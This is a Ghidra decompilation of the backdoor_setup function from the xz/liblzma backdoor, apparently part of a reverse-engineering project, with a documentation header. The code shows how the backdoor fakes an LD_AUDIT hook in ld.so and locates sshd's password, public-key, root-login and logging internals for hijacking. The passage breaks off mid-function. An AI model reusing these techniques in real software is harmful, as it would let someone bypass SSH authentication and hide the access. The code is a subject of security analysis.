// /home/kali/xzre-ghidra/xzregh/105830_backdoor_setup.c
// Function: backdoor_setup @ 0x105830
// Calling convention: __stdcall
// Prototype: BOOL __stdcall backdoor_setup(backdoor_setup_params_t * params)
/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief the backdoor main method that installs the backdoor_symbind64() callback
 *
 *   If the backdoor initialization steps are successful the final step modifies some ld.so private structures
 *   to simulate a LD_AUDIT library and install the backdoor_symbind64() as a symbind callback.
 *
 *   To pass the various conditions in ld.so's _dl_audit_symbind_alt the following fields are modified:
 *   - the sshd and libcrypto struct link_map::l_audit_any_plt flag is set to 1
 *   - the sshd struct auditstate::bindflags is set to LA_FLG_BINDFROM
 *   - the libcrypto struct auditstate::bindflags is set to LA_FLG_BINDTO
 *   - _rtld_global_ro::_dl_audit is set to point to ldso_ctx_t::hooked_audit_iface
 *   - the struct audit_ifaces::symbind64 is set to backdoor_symbind64()
 *   - _rtld_global_ro::_dl_naudit is set to 1
 *
 *   After the modifications backdoor_symbind64() will be called for all symbol bindings from sshd to libcrypto.
 *
 *   @param params parameters from backdoor_init_stage()
 *   @return BOOL unused, always return FALSE
 */

/* WARNING: Removing unreachable block (ram,0x00105ab2) */
/* WARNING: Removing unreachable block (ram,0x00105aa3) */

BOOL backdoor_setup(backdoor_setup_params_t *params)

{
  global_context_t *ctx;
  imported_funcs_t *imported_funcs;
  u32 *puVar1;
  audit_ifaces *paVar2;
  elf_handles_t *peVar3;
  int iVar4;
  uint uVar5;
  u32 uVar6;
  u64 *puVar7;
  u64 *puVar8;
  backdoor_hooks_ctx_t *pbVar9;
  backdoor_hooks_data_t **ppbVar10;
  u64 uVar11;
  pfn_RSA_get0_key_t ppVar12;
  pfn_EVP_PKEY_set1_RSA_t ppVar13;
  sshd_monitor_func_t psVar14;
  _func_67 *p_Var15;
  Elf64_Addr EVar16;
  Elf64_Ehdr *pEVar17;
  sshd_ctx_t *psVar18;
  byte *pbVar19;
  undefined4 uVar20;
  undefined4 uVar21;
  undefined4 uVar22;
  bool bVar23;
  undefined8 uVar24;
  elf_info_t *elf_info;
  byte bVar25;
  EncodedStringId EVar26;
  BOOL BVar27;
  void *pvVar28;
  lzma_allocator *plVar29;
  _func_17 *p_Var30;
  lzma_allocator *plVar31;
  elf_info_t *peVar32;
  _func_41 *p_Var33;
  void *pvVar34;
  elf_functions_t *peVar35;
  _func_60 *p_Var36;
  Elf64_Sym *pEVar37;
  char *pcVar38;
  _func_58 *p_Var39;
  Elf64_Sym *pEVar40;
  Elf64_Sym *pEVar41;
  _func_55 *p_Var42;
  Elf64_Sym *pEVar43;
  Elf64_Rela *mem_address;
  int *piVar44;
  u8 *puVar45;
  long lVar46;
  u8 *puVar47;
  Elf64_Ehdr *string_begin;
  u8 *puVar48;
  backdoor_data_t *pbVar49;
  elf_entry_ctx_t *peVar50;
  global_context_t *pgVar51;
  backdoor_hooks_data_t *pbVar52;
  sshd_ctx_t *psVar53;
  sshd_log_ctx_t *psVar54;
  imported_funcs_t *piVar55;
  undefined4 *puVar56;
  u8 *puVar57;
  dasm_ctx_t *pdVar58;
  audit_ifaces *paVar59;
  undefined1 uVar60;
  undefined1 uVar61;
  u8 *puVar62;
  sshd_monitor_func_t *code_start;
  EncodedStringId *stringId_inOut;
  int iVar63;
  byte bVar64;
  u8 *local_b48;
  u8 *local_b20;
  backdoor_hooks_data_t *local_b10;
  EncodedStringId local_acc;
  ptrdiff_t local_ac8;
  pfn_RSA_public_decrypt_t *local_ac0;
  pfn_EVP_PKEY_set1_RSA_t *local_ab8;
  pfn_RSA_get0_key_t *local_ab0;
  void *local_aa8;
  u64 local_aa0;
  u64 local_a98;
  u64 local_a90;
  main_elf_t local_a88;
  u64 *local_a70;
  backdoor_shared_libraries_data_t local_a68;
  undefined1 local_a30 [88];
  undefined1 local_9d8 [64];
  u64 local_998;
  backdoor_data_t local_980;
  
  bVar64 = 0;
  local_acc = 0;
  pbVar49 = &local_980;
  for (lVar46 = 0x256; lVar46 != 0; lVar46 = lVar46 + -1) {
    *(undefined4 *)&pbVar49->main_map = 0;
    pbVar49 = (backdoor_data_t *)((long)&pbVar49->main_map + 4);
  }
  peVar3 = &local_980.elf_handles;
  local_980.elf_handles.dynamic_linker = &local_980.dynamic_linker_info;
  local_980.elf_handles.libc = &local_980.libc_info;
  local_ac8 = 0;
  local_ac0 = (pfn_RSA_public_decrypt_t *)0x0;
  local_ab8 = (pfn_EVP_PKEY_set1_RSA_t *)0x0;
  local_ab0 = (pfn_RSA_get0_key_t *)0x0;
  local_aa8 = (void *)0x0;
  peVar50 = params->entry_ctx;
  local_980.elf_handles.liblzma = &local_980.liblzma_info;
  local_980.elf_handles.libcrypto = &local_980.libcrypto_info;
  local_980.elf_handles.main = &local_980.main_info;
  local_980.data_handle.data = &local_980;
  local_980.data_handle.elf_handles = peVar3;
  update_got_address(peVar50);
  pvVar28 = (peVar50->got_ctx).got_ptr;
  if (pvVar28 != (void *)0x0) {
    puVar7 = *(u64 **)((long)pvVar28 + (long)(peVar50->got_ctx).cpuid_fn * 8 + 0x18);
    puVar8 = peVar50->frame_address;
    lVar46 = (long)puVar8 - (long)puVar7;
    if (puVar8 <= puVar7) {
      lVar46 = (long)puVar7 - (long)puVar8;
    }
    if (lVar46 < 0x50001) {
      string_begin = (Elf64_Ehdr *)((ulong)puVar7 & 0xfffffffffffff000);
      pEVar17 = string_begin + -0x800;
LAB_00105951:
      EVar26 = get_string_id((char *)string_begin,(char *)0x0);
      if (EVar26 != STR_ELF) goto code_r0x00105962;
      local_a88.__libc_stack_end = &local_aa8;
      local_a70 = params->entry_ctx->frame_address;
      local_a88.elf_handles = peVar3;
      local_a88.dynamic_linker_ehdr = string_begin;
      BVar27 = main_elf_parse(&local_a88);
      if (BVar27 != 0) {
        local_980.import_resolver = get_lzma_allocator();
        lVar46 = 0;
        do {
          *(undefined1 *)((long)&local_980.fake_allocator.alloc + lVar46) =
               *(undefined1 *)((long)&(local_980.import_resolver)->alloc + lVar46);
          lVar46 = lVar46 + 1;
        } while (lVar46 != 0x18);
        local_a68.RSA_public_decrypt_plt = &local_ac0;
        local_a68.EVP_PKEY_set1_RSA_plt = &local_ab8;
        local_a68.RSA_get0_key_plt = &local_ab0;
        local_a68.hooks_data_addr = params->hook_params->hooks_data_addr;
        local_a68.data = &local_980;
        local_a68.elf_handles = peVar3;
        local_a68.libc_imports = &local_980.libc_imports;
        BVar27 = process_shared_libraries(&local_a68);
        if (BVar27 == 0) goto LAB_00105a59;
        local_b10 = *params->hook_params->hooks_data_addr;
        ctx = &local_b10->global_ctx;
        imported_funcs = &local_b10->imported_funcs;
        pgVar51 = ctx;
        for (lVar46 = 0x5a; lVar46 != 0; lVar46 = lVar46 + -1) {
          pgVar51->uses_endbr64 = 0;
          pgVar51 = (global_context_t *)((long)pgVar51 + (ulong)bVar64 * -8 + 4);
        }
        (local_b10->global_ctx).sshd_log_ctx = &local_b10->sshd_log_ctx;
        pbVar9 = params->hook_params;
        (local_b10->global_ctx).imported_funcs = imported_funcs;
        (local_b10->global_ctx).sshd_ctx = &local_b10->sshd_ctx;
        ppbVar10 = pbVar9->hooks_data_addr;
        (local_b10->global_ctx).libc_imports = &local_b10->libc_imports;
        pbVar52 = *ppbVar10;
        uVar11 = pbVar52->signed_data_size;
        (local_b10->global_ctx).current_data_size = 0;
        (local_b10->global_ctx).payload_data = &pbVar52->signed_data;
        (local_b10->global_ctx).payload_data_size = uVar11;
        elf_find_string_references(&local_980.main_info,&local_980.string_refs);
        local_aa0 = 0;
        pvVar28 = elf_get_code_segment(local_980.elf_handles.liblzma,&local_aa0);
        if (pvVar28 != (void *)0x0) {
          (local_b10->global_ctx).lzma_code_start = pvVar28;
          (local_b10->global_ctx).lzma_code_end = (void *)((long)pvVar28 + local_aa0);
          pbVar52 = local_b10;
          for (lVar46 = 0x4e; lVar46 != 0; lVar46 = lVar46 + -1) {
            (pbVar52->ldso_ctx)._unknown1459[0] = '\0';
            (pbVar52->ldso_ctx)._unknown1459[1] = '\0';
            (pbVar52->ldso_ctx)._unknown1459[2] = '\0';
            (pbVar52->ldso_ctx)._unknown1459[3] = '\0';
            pbVar52 = (backdoor_hooks_data_t *)((long)pbVar52 + (ulong)bVar64 * -8 + 4);
          }
          pbVar9 = params->hook_params;
          (local_b10->ldso_ctx).imported_funcs = imported_funcs;
          ppVar12 = pbVar9->hook_RSA_get0_key;
          (local_b10->ldso_ctx).hook_RSA_public_decrypt = pbVar9->hook_RSA_public_decrypt;
          ppVar13 = params->shared->hook_EVP_PKEY_set1_RSA;
          (local_b10->ldso_ctx).hook_RSA_get0_key = ppVar12;
          (local_b10->ldso_ctx).hook_EVP_PKEY_set1_RSA = ppVar13;
          psVar53 = &local_b10->sshd_ctx;
          for (lVar46 = 0x38; lVar46 != 0; lVar46 = lVar46 + -1) {
            psVar53->have_mm_answer_keyallowed = 0;
            psVar53 = (sshd_ctx_t *)((long)psVar53 + (ulong)bVar64 * -8 + 4);
          }
          (local_b10->sshd_ctx).mm_answer_authpassword_hook =
               params->shared->mm_answer_authpassword_hook;
          psVar14 = params->hook_params->mm_answer_keyverify;
          (local_b10->sshd_ctx).mm_answer_keyallowed = params->hook_params->mm_answer_keyallowed;
          (local_b10->sshd_ctx).mm_answer_keyverify = psVar14;
          psVar54 = &local_b10->sshd_log_ctx;
          for (lVar46 = 0x1a; lVar46 != 0; lVar46 = lVar46 + -1) {
            psVar54->logging_disabled = 0;
            psVar54 = (sshd_log_ctx_t *)((long)psVar54 + (ulong)bVar64 * -8 + 4);
          }
          (local_b10->sshd_log_ctx).mm_log_handler = (_func_63 *)params->hook_params->mm_log_handler
          ;
          *params->shared->globals = ctx;
          piVar55 = imported_funcs;
          for (lVar46 = 0x4a; lVar46 != 0; lVar46 = lVar46 + -1) {
            *(undefined4 *)&piVar55->RSA_public_decrypt = 0;
            piVar55 = (imported_funcs_t *)((long)piVar55 + (ulong)bVar64 * -8 + 4);
          }
          (local_b10->imported_funcs).RSA_public_decrypt_plt = local_ac0;
          (local_b10->imported_funcs).EVP_PKEY_set1_RSA_plt = local_ab8;
          (local_b10->imported_funcs).RSA_get0_key_plt = local_ab0;
          lVar46 = 0;
          do {
            (local_b10->libc_imports)._unknown993[lVar46 + -4] =
                 local_980.libc_imports._unknown993[lVar46 + -4];
            lVar46 = lVar46 + 1;
          } while (lVar46 != 0x70);
          (local_b10->imported_funcs).libc = &local_b10->libc_imports;
          (local_b10->libc_imports).__libc_stack_end = local_aa8;
          plVar29 = get_lzma_allocator();
          plVar29->opaque = local_980.elf_handles.libc;
          p_Var30 = (_func_17 *)lzma_alloc(0x440,plVar29);
          (local_b10->libc_imports).malloc_usable_size = p_Var30;
          if (p_Var30 != (_func_17 *)0x0) {
            (local_b10->libc_imports).resolved_imports_count =
                 (local_b10->libc_imports).resolved_imports_count + 1;
          }
          BVar27 = find_dl_audit_offsets(&local_980.data_handle,&local_ac8,local_b10,imported_funcs)
          ;
          if (BVar27 == 0) goto LAB_00105a60;
          plVar31 = get_lzma_allocator();
          plVar31->opaque = local_980.elf_handles.libcrypto;
          peVar32 = local_980.elf_handles.libcrypto;
          if (local_980.elf_handles.libcrypto != (elf_info_t *)0x0) {
            peVar32 = (elf_info_t *)
                      elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_get0_key,0);
            p_Var33 = (_func_41 *)lzma_alloc(0xaf8,plVar31);
            (local_b10->imported_funcs).EVP_MD_CTX_new = p_Var33;
            if (p_Var33 != (_func_41 *)0x0) {
              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
              *puVar1 = *puVar1 + 1;
            }
          }
          elf_info = local_980.elf_handles.main;
          local_a30._0_8_ = (u8 *)0x0;
          local_9d8._0_8_ = (u8 *)0x0;
          pvVar28 = elf_get_code_segment(local_980.elf_handles.main,(u64 *)local_a30);
          puVar62 = (u8 *)(local_a30._0_8_ + (long)pvVar28);
          pvVar34 = elf_get_data_segment(elf_info,(u64 *)local_9d8,0);
          (local_b10->global_ctx).sshd_code_start = pvVar28;
          (local_b10->global_ctx).sshd_code_end = puVar62;
          (local_b10->global_ctx).sshd_data_start = pvVar34;
          (local_b10->global_ctx).sshd_data_end = (u8 *)(local_9d8._0_8_ + (long)pvVar34);
          peVar35 = get_elf_functions_address();
          if (((peVar35 == (elf_functions_t *)0x0) ||
              (p_Var15 = peVar35->elf_symbol_get_addr, p_Var15 == (_func_67 *)0x0)) ||
             (peVar35->elf_parse == (_func_68 *)0x0)) goto LAB_00105a60;
          pEVar37 = (Elf64_Sym *)0x0;
          p_Var36 = (_func_60 *)(*p_Var15)(local_980.elf_handles.libcrypto,STR_BN_free);
          (local_b10->imported_funcs).BN_free = p_Var36;
          if (p_Var36 != (_func_60 *)0x0) {
            pEVar37 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_bin2bn,0);
          }
          local_acc = STR_ssh_rsa_cert_v01_openssh_com;
          pcVar38 = elf_find_string(local_980.elf_handles.main,&local_acc,(void *)0x0);
          (local_b10->global_ctx).STR_ssh_rsa_cert_v01_openssh_com = pcVar38;
          if (pcVar38 == (char *)0x0) goto LAB_00105a60;
          local_acc = STR_rsa_sha2_256;
          pcVar38 = elf_find_string(local_980.elf_handles.main,&local_acc,(void *)0x0);
          (local_b10->global_ctx).STR_rsa_sha2_256 = pcVar38;
          if (pcVar38 == (char *)0x0) goto LAB_00105a60;
          pEVar40 = (Elf64_Sym *)0x0;
          p_Var39 = (_func_58 *)elf_symbol_get_addr(local_980.elf_handles.libcrypto,STR_BN_bn2bin);
          (local_b10->imported_funcs).BN_bn2bin = p_Var39;
          if (p_Var39 != (_func_58 *)0x0) {
            pEVar40 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_dup,0);
            if (pEVar40 != (Elf64_Sym *)0x0) {
              EVar16 = pEVar40->st_value;
              pEVar17 = (local_980.elf_handles.libcrypto)->elfbase;
              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
              *puVar1 = *puVar1 + 1;
              (local_b10->imported_funcs).BN_dup = (_func_53 *)(pEVar17->e_ident + EVar16);
            }
            pEVar40 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_new,0);
            if ((local_b10->imported_funcs).BN_free != (_func_60 *)0x0) {
              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
              *puVar1 = *puVar1 + 1;
            }
          }
          pEVar41 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_free,0);
          p_Var42 = (_func_55 *)(*p_Var15)(local_980.elf_handles.libcrypto,STR_RSA_set0_key);
          pEVar43 = (Elf64_Sym *)0x0;
          (local_b10->imported_funcs).RSA_set0_key = p_Var42;
          if (p_Var42 != (_func_55 *)0x0) {
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
            pEVar43 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_sign,0);
            if (peVar32 != (elf_info_t *)0x0) {
              EVar16 = peVar32->first_vaddr;
              pEVar17 = (local_980.elf_handles.libcrypto)->elfbase;
              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
              *puVar1 = *puVar1 + 1;
              (local_b10->imported_funcs).RSA_get0_key =
                   (pfn_RSA_get0_key_t)(pEVar17->e_ident + EVar16);
            }
          }
          if ((local_b10->imported_funcs).BN_bn2bin != (_func_58 *)0x0) {
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
          }
          BVar27 = sshd_find_sensitive_data
                             (local_980.elf_handles.main,local_980.elf_handles.libcrypto,
                              &local_980.string_refs,imported_funcs,ctx);
          if (BVar27 == 0) goto LAB_00105a60;
          if (pEVar37 != (Elf64_Sym *)0x0) {
            EVar16 = pEVar37->st_value;
            pEVar17 = (local_980.elf_handles.libcrypto)->elfbase;
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
            (local_b10->imported_funcs).BN_bin2bn = (_func_54 *)(pEVar17->e_ident + EVar16);
          }
          if (pEVar40 != (Elf64_Sym *)0x0) {
            EVar16 = pEVar40->st_value;
            pEVar17 = (local_980.elf_handles.libcrypto)->elfbase;
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
            (local_b10->imported_funcs).RSA_new = (_func_52 *)(pEVar17->e_ident + EVar16);
          }
          if (pEVar41 != (Elf64_Sym *)0x0) {
            EVar16 = pEVar41->st_value;
            pEVar17 = (local_980.elf_handles.libcrypto)->elfbase;
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
            (local_b10->imported_funcs).RSA_free = (_func_59 *)(pEVar17->e_ident + EVar16);
          }
          if (pEVar43 != (Elf64_Sym *)0x0) {
            EVar16 = pEVar43->st_value;
            pEVar17 = (local_980.elf_handles.libcrypto)->elfbase;
            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
            *puVar1 = *puVar1 + 1;
            (local_b10->imported_funcs).RSA_sign = (_func_57 *)(pEVar17->e_ident + EVar16);
          }
          pEVar37 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptUpdate,0);
          peVar32 = local_980.elf_handles.main;
          psVar53 = (local_b10->global_ctx).sshd_ctx;
          local_a30._0_8_ = (u8 *)0x0;
          local_a98 = local_a98 & 0xffffffff00000000;
          psVar53->have_mm_answer_keyallowed = 0;
          psVar53->have_mm_answer_authpassword = 0;
          psVar53->have_mm_answer_keyverify = 0;
          pvVar28 = elf_get_data_segment(local_980.elf_handles.main,(u64 *)local_a30,0);
          uVar24 = local_a30._0_8_;
          if ((pvVar28 != (void *)0x0) &&
             (local_980.string_refs.entries[0x12].func_start != (void *)0x0)) {
            psVar53->mm_request_send_start = local_980.string_refs.entries[0x12].func_start;
            psVar53->mm_request_send_end = local_980.string_refs.entries[0x12].func_end;
            local_a98 = CONCAT44(local_a98._4_4_,0x400);
            pcVar38 = elf_find_string(peVar32,(EncodedStringId *)&local_a98,(void *)0x0);
            psVar53->STR_without_password = pcVar38;
            if ((pcVar38 != (char *)0x0) &&
               (BVar27 = elf_find_function_pointer
                                   (XREF_mm_answer_authpassword,
                                    &psVar53->mm_answer_authpassword_start,
                                    &psVar53->mm_answer_authpassword_end,
                                    &psVar53->mm_answer_authpassword_ptr,peVar32,
                                    &local_980.string_refs,ctx), BVar27 == 0)) {
              psVar53->mm_answer_authpassword_start = (void *)0x0;
              psVar53->mm_answer_authpassword_end = (void *)0x0;
              psVar53->mm_answer_authpassword_ptr = (sshd_monitor_func_t *)0x0;
            }
            local_a98 = CONCAT44(local_a98._4_4_,0x7b8);
            pcVar38 = elf_find_string(peVar32,(EncodedStringId *)&local_a98,(void *)0x0);
            psVar53->STR_publickey = pcVar38;
            if (pcVar38 != (char *)0x0) {
              BVar27 = elf_find_function_pointer
                                 (XREF_mm_answer_keyallowed,&psVar53->mm_answer_keyallowed_start,
                                  &psVar53->mm_answer_keyallowed_end,
                                  &psVar53->mm_answer_keyallowed_ptr,peVar32,&local_980.string_refs,
                                  ctx);
              if (BVar27 == 0) {
                psVar53->mm_answer_keyallowed_start = (sshd_monitor_func_t *)0x0;
                psVar53->mm_answer_keyallowed_end = (void *)0x0;
                psVar53->mm_answer_keyallowed_ptr = (void *)0x0;
              }
              else {
                BVar27 = elf_find_function_pointer
                                   (XREF_mm_answer_keyverify,&psVar53->mm_answer_keyverify_start,
                                    &psVar53->mm_answer_keyverify_end,
                                    &psVar53->mm_answer_keyverify_ptr,peVar32,&local_980.string_refs
                                    ,ctx);
                if (BVar27 == 0) {
                  psVar53->mm_answer_keyverify_start = (void *)0x0;
                  psVar53->mm_answer_keyverify_end = (void *)0x0;
                  psVar53->mm_answer_keyverify_ptr = (void *)0x0;
                }
              }
            }
            if ((psVar53->mm_answer_authpassword_start != (void *)0x0) ||
               (psVar53->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0)) {
              psVar18 = (local_b10->global_ctx).sshd_ctx;
              local_9d8._0_8_ = (u8 *)0x0;
              code_start = (sshd_monitor_func_t *)psVar18->mm_answer_authpassword_start;
              if (code_start == (sshd_monitor_func_t *)0x0) {
                code_start = psVar18->mm_answer_keyallowed_start;
                if (code_start == (sshd_monitor_func_t *)0x0) goto LAB_001065af;
                puVar62 = (u8 *)psVar18->mm_answer_keyallowed_end;
              }
              else {
                puVar62 = (u8 *)psVar18->mm_answer_authpassword_end;
              }
              bVar23 = false;
              pcVar38 = (char *)0x0;
              local_a90 = CONCAT44(local_a90._4_4_,0x198);
              while (pcVar38 = elf_find_string(peVar32,(EncodedStringId *)&local_a90,pcVar38),
                    pcVar38 != (char *)0x0) {
                local_9d8._0_8_ = (u8 *)0x0;
                EVar26 = (EncodedStringId)pcVar38;
                mem_address = elf_find_rela_reloc(peVar32,EVar26,0);
                if (mem_address == (Elf64_Rela *)0x0) {
                  local_9d8._0_8_ = (u8 *)0x0;
                  bVar23 = true;
                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(peVar32,EVar26);
                }
                while (mem_address != (Elf64_Rela *)0x0) {
                  do {
                    BVar27 = elf_contains_vaddr_relro(peVar32,(u64)mem_address,8,1);
                    if ((BVar27 != 0) &&
                       (BVar27 = find_instruction_with_mem_operand_ex
                                           ((u8 *)code_start,puVar62,(dasm_ctx_t *)0x0,0x109,
                                            mem_address), BVar27 != 0)) {
                      pvVar34 = psVar53->mm_answer_authpassword_start;
                      ((local_b10->global_ctx).sshd_ctx)->STR_unknown_ptr = (char *)mem_address;
                      if (pvVar34 != (void *)0x0) {
                        psVar53->have_mm_answer_authpassword = 1;
                      }
                      if ((psVar53->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0) &&
                         (psVar53->have_mm_answer_keyallowed = 1,
                         psVar53->mm_answer_keyverify_start != (void *)0x0)) {
                        psVar53->have_mm_answer_keyverify = 1;
                      }
                      piVar44 = (int *)find_addr_referenced_in_mov_instruction
                                                 (XREF_start_pam,&local_980.string_refs,pvVar28,
                                                  (u8 *)(uVar24 + (long)pvVar28));
                      if (piVar44 != (int *)0x0) {
                        ((local_b10->global_ctx).sshd_ctx)->use_pam_ptr = piVar44;
                      }
                      stringId_inOut = (EncodedStringId *)local_9d8;
                      bVar23 = false;
                      local_9d8._8_4_ = 0x70;
                      local_9d8._0_8_ = (u8 *)0xc5800000948;
                      goto LAB_00106471;
                    }
                    if (bVar23) goto LAB_001063c8;
                    mem_address = elf_find_rela_reloc(peVar32,EVar26,0);
                  } while (mem_address != (Elf64_Rela *)0x0);
                  local_9d8._0_8_ = (u8 *)0x0;
LAB_001063c8:
                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(peVar32,EVar26);
                  bVar23 = true;
                }
                pcVar38 = pcVar38 + 8;
              }
            }
          }
          goto LAB_001065af;
        }
        goto LAB_00105a60;
      }
    }
  }
LAB_00105a59:
  local_b10 = (backdoor_hooks_data_t *)0x0;
  goto LAB_00105a60;
code_r0x00105962:
  string_begin = string_begin + -0x40;
  if (string_begin == pEVar17) goto LAB_00105a59;
  goto LAB_00105951;
LAB_00106471:
  do {
    pcVar38 = elf_find_string(peVar32,stringId_inOut,(void *)0x0);
    if (pcVar38 != (char *)0x0) {
      if (bVar23) {
        psVar53 = (local_b10->global_ctx).sshd_ctx;
        psVar53->_unknown1186[0] = '\x01';
        psVar53->_unknown1186[1] = '\0';
        psVar53->_unknown1186[2] = '\0';
        psVar53->_unknown1186[3] = '\0';
        goto LAB_001064b8;
      }
      bVar23 = true;
    }
    stringId_inOut = stringId_inOut + 1;
  } while (stringId_inOut != (EncodedStringId *)(local_9d8 + 0xc));
  psVar53 = (local_b10->global_ctx).sshd_ctx;
  psVar53->_unknown1186[0] = '\0';
  psVar53->_unknown1186[1] = '\0';
  psVar53->_unknown1186[2] = '\0';
  psVar53->_unknown1186[3] = '\0';
LAB_001064b8:
  piVar44 = (int *)find_addr_referenced_in_mov_instruction
                             (XREF_auth_root_allowed,&local_980.string_refs,pvVar28,
                              (u8 *)(uVar24 + (long)pvVar28));
  if (piVar44 != (int *)0x0) {
    if ((*(int *)((local_b10->global_ctx).sshd_ctx)->_unknown1186 != 0) &&
       ((local_b10->global_ctx).uses_endbr64 != 0)) {
      iVar63 = 0;
      lVar46 = 0;
      local_9d8._8_4_ = 0x10;
      local_9d8._0_8_ = (u8 *)0xf0000000e;
      iVar4 = 0;
      do {
        puVar62 = (u8 *)local_980.string_refs.entries[*(uint *)(local_9d8 + lVar46 * 4)].func_start;
        if (puVar62 != (u8 *)0x0) {
          puVar48 = (u8 *)local_980.string_refs.entries[*(uint *)(local_9d8 + lVar46 * 4)].func_end;
          iVar63 = iVar63 + 1;
          BVar27 = find_instruction_with_mem_operand(puVar62,puVar48,(dasm_ctx_t *)0x0,piVar44);
          if ((BVar27 != 0) ||
             (BVar27 = find_add_instruction_with_mem_operand
                                 (puVar62,puVar48,(dasm_ctx_t *)0x0,piVar44), BVar27 != 0)) {
            iVar4 = iVar4 + 1;
          }
        }
        lVar46 = lVar46 + 1;
      } while (lVar46 != 3);
      if ((iVar63 != 0) && (iVar4 == 0)) goto LAB_001065af;
    }
    ((local_b10->global_ctx).sshd_ctx)->permit_root_login_ptr = piVar44;
  }
LAB_001065af:
  pEVar40 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
  BVar27 = sshd_find_monitor_struct(local_980.elf_handles.main,&local_980.string_refs,ctx);
  if (BVar27 == 0) {
    (local_b10->sshd_ctx).have_mm_answer_keyallowed = 0;
    (local_b10->sshd_ctx).have_mm_answer_keyverify = 0;
  }
  psVar54 = (local_b10->global_ctx).sshd_log_ctx;
  plVar29->opaque = local_980.elf_handles.libc;
  local_a98 = 0;
  psVar54->logging_disabled = 0;
  psVar54->log_hooking_possible = 0;
  pvVar28 = elf_get_code_segment(&local_980.main_info,&local_a98);
  uVar11 = local_a98;
  if ((((pvVar28 != (void *)0x0) && (0x10 < local_a98)) &&
      ((u8 *)local_980.string_refs.entries[0x19].func_start != (u8 *)0x0)) &&
     (((local_b10->global_ctx).uses_endbr64 == 0 ||
      (BVar27 = is_endbr64_instruction
                          ((u8 *)local_980.string_refs.entries[0x19].func_start,
                           (u8 *)((long)local_980.string_refs.entries[0x19].func_start + 4),0xe230),
      BVar27 != 0)))) {
    psVar54->sshlogv = local_980.string_refs.entries[0x19].func_start;
    puVar56 = (undefined4 *)local_a30;
    for (lVar46 = 0x16; lVar46 != 0; lVar46 = lVar46 + -1) {
      *puVar56 = 0;
      puVar56 = puVar56 + (ulong)bVar64 * -2 + 1;
    }
    if ((u8 *)local_980.string_refs.entries[0x1a].func_start != (u8 *)0x0) {
      local_b48 = (u8 *)local_980.string_refs.entries[0x1a].func_start;
      local_b20 = (u8 *)0x0;
      puVar62 = (u8 *)0x0;
      do {
        while( true ) {
          if ((local_980.string_refs.entries[0x1a].func_end <= local_b48) ||
             ((local_b20 != (u8 *)0x0 && (puVar62 != (u8 *)0x0)))) goto LAB_00106bf0;
          BVar27 = x86_dasm((dasm_ctx_t *)local_a30,local_b48,
                            (u8 *)local_980.string_refs.entries[0x1a].func_end);
          if (BVar27 != 0) break;
          local_b48 = local_b48 + 1;
        }
        if ((local_a30._40_4_ & 0xfffffffd) == 0xb1) {
          if (local_a30[0x1d] != '\x03') goto LAB_00106735;
          if ((local_a30._16_2_ & 0x1040) == 0) {
            if ((local_a30._16_2_ & 0x40) != 0) {
              bVar25 = 0;
LAB_001067cf:
              uVar61 = local_a30[0x1f];
              if ((local_a30._16_2_ & 0x20) != 0) {
                uVar61 = local_a30[0x1f] | (local_a30[0x1b] & 1) << 3;
              }
              goto LAB_001067ed;
            }
            uVar61 = 0;
          }
          else {
            if ((local_a30._16_2_ & 0x40) != 0) {
              bVar25 = SUB41(local_a30._28_4_,2);
              if ((local_a30._16_2_ & 0x20) != 0) {
                bVar25 = bVar25 | local_a30[0x1b] * '\x02' & 8U;
              }
              goto LAB_001067cf;
            }
            uVar61 = local_a30[0x11] & 0x10;
            if ((local_a30._16_2_ & 0x1000) == 0) goto LAB_001067fb;
            bVar25 = local_a30[0x20];
            if ((local_a30._16_2_ & 0x20) != 0) {
              bVar25 = local_a30[0x20] | (local_a30[0x1b] & 1) << 3;
            }
            uVar61 = 0;
LAB_001067ed:
            if (bVar25 != uVar61) goto LAB_00106735;
          }
LAB_001067fb:
          uVar60 = 0;
          uVar5 = 0;
          puVar62 = (u8 *)0x0;
          puVar56 = (undefined4 *)local_9d8;
          for (lVar46 = 0x16; lVar46 != 0; lVar46 = lVar46 + -1) {
            *puVar56 = 0;
            puVar56 = puVar56 + (ulong)bVar64 * -2 + 1;
          }
          puVar48 = (u8 *)0x0;
          puVar57 = local_b48;
          for (; (puVar57 < local_980.string_refs.entries[0x1a].func_end && (uVar5 < 5));
              uVar5 = uVar5 + 1) {
            if ((puVar48 != (u8 *)0x0) && (puVar62 != (u8 *)0x0)) goto LAB_00106b3c;
            BVar27 = find_mov_instruction
                               (puVar57,(u8 *)local_980.string_refs.entries[0x1a].func_end,1,0,
                                (dasm_ctx_t *)local_9d8);
            if (BVar27 == 0) break;
            if ((local_9d8._16_2_ & 0x1040) != 0) {
              if ((local_9d8._16_2_ & 0x40) == 0) {
                uVar60 = local_9d8[0x11] & 0x10;
                if (((local_9d8._16_2_ & 0x1000) != 0) &&
                   (uVar60 = local_9d8[0x20], (local_9d8._16_2_ & 0x20) != 0)) {
                  bVar25 = local_9d8[0x1b] << 3;
                  goto LAB_001068e4;
                }
              }
              else {
                uVar60 = local_9d8[0x1e];
                if ((local_9d8._16_2_ & 0x20) != 0) {
